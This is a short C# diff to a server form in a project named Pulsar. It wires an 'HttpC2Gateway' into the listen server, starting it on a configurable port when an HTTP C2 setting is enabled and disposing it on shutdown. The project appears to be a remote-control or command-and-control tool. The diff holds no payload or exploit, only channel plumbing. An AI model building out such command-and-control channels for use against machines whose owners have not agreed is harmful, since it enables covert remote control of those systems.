@@ -63,6 +63,8 @@ namespace Pulsar.Server.Forms
         [DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
         public PulsarServer ListenServer { get; set; }
 
+        private HttpC2Gateway _httpC2Gateway;
+
         private DiscordRPC.DiscordRPC _discordRpc;  // Added Discord RPC
 
         private const int STATUS_ID = 5;
@@ -273,6 +275,12 @@ namespace Pulsar.Server.Forms
         {
             try
             {
+                if (Settings.HttpC2Enabled)
+                {
+                    _httpC2Gateway ??= new HttpC2Gateway(ListenServer, Settings.HttpC2Port);
+                    _httpC2Gateway.Start();
+                }
+
                 var allPorts = new List<ushort> { Settings.ListenPort };
                 if (Settings.ListenPorts != null)
                     allPorts.AddRange(Settings.ListenPorts);
@@ -451,6 +459,9 @@ namespace Pulsar.Server.Forms
             {
                 SaveNotificationHistory();
                 SaveAutoTasks();
+
+                _httpC2Gateway?.Dispose();
+                _httpC2Gateway = null;
 
                 if (ListenServer != null)
                     ListenServer.Disconnect();
